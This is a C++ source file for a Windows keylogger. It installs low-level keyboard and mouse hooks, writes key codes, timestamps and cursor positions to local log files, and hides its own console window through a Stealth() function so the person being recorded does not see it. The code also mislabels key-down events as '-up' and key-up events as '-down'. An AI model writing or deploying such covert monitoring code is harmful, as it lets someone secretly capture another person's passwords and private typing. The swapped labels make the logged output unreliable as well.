#include <iostream>
#include <windows.h>
#include <winuser.h>
#include <stdio.h>
#include <fstream>
#include <list>
#include <cstring>
#include <string>
#include <sstream>

using namespace std;
#define key_log_file "key_log.txt"
#define mouse_log_file "mouse_log.txt"

list<string> mouse_buffer = list<string>();
list<string> key_buffer = list<string>();
int Save (fstream file);
void Stealth();
fstream file;

void save_to_file(){
    if(key_buffer.size() >= 50){
        file.open(key_log_file , ios::app | ios::out);
        while(! key_buffer.empty()){
            file<<key_buffer.front();
            key_buffer.pop_front();
        }
        file.close();
    }

    if(mouse_buffer.size() >= 25){
        file.open(mouse_log_file , ios::app | ios::out);
        while(! mouse_buffer.empty()){
            file<<mouse_buffer.front();
            mouse_buffer.pop_front();
        }
    file.close();
    }
}


LRESULT CALLBACK key_proc(int nCode,WPARAM wParam,LPARAM lParam)
{
    stringstream temp;
    PKBDLLHOOKSTRUCT p = (PKBDLLHOOKSTRUCT)lParam;
    //file.open(key_log_file , ios::app | ios::out);
    if(wParam == WM_KEYDOWN)
        temp <<"-up\t"<<GetTickCount()<<"\t"<<p->vkCode<<endl;
    if(wParam == WM_KEYUP)
        temp <<"-down\t"<<GetTickCount()<<"\t"<<p->vkCode<<endl;
    //file.close();

    key_buffer.push_front(temp.str());

    save_to_file();

    return CallNextHookEx(NULL, nCode, wParam, lParam);
}

LRESULT CALLBACK mouse_proc(int nCode,WPARAM wParam,LPARAM lParam)
{
    stringstream temp;
    MOUSEHOOKSTRUCT* mouse = (MOUSEHOOKSTRUCT*)lParam;
    string move_type;
    switch(wParam)
    {
    case WM_LBUTTONDOWN:
        move_type = "LBUTTONDOWN";
        break;
    case WM_LBUTTONUP:
        move_type = "LBUTTONUP";
        break;
    case WM_MOUSEMOVE:
        move_type = "MOUSEMOVE";
        break;
    case WM_MOUSEWHEEL:
        move_type = "MOUSEWHEEL";
        break;
    case WM_RBUTTONDOWN:
        move_type = "RBUTTONDOWN";
        break;
    case WM_RBUTTONUP:
        move_type = "RBUTTONUP";
        break;
    default:
        break;
    }
    //file.open(mouse_log_file , ios::out | ios::app);
    temp<<move_type<<"\t"<<GetTickCount()<<"\t"<<(mouse->pt).x<<"," <<(mouse->pt).y<<endl;
    mouse_buffer.push_front(temp.str());

    save_to_file();

    //file.close();
    return CallNextHookEx(NULL, nCode, wParam, lParam);
}
int main()
{
    Stealth();//use this line when we want to make the program to work
    HHOOK hhkLowLevelKybd = SetWindowsHookEx(WH_KEYBOARD_LL, key_proc , 0, 0);
    SetWindowsHookEx(WH_MOUSE_LL , mouse_proc, 0 , 0 );
    MSG msg;
    while(!GetMessage(&msg, NULL, NULL, NULL))
    {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }
    file.close();
}

void Stealth()
{
HWND Stealth;
AllocConsole();
Stealth = FindWindowA("ConsoleWindowClass", NULL);
ShowWindow(Stealth,0);
}
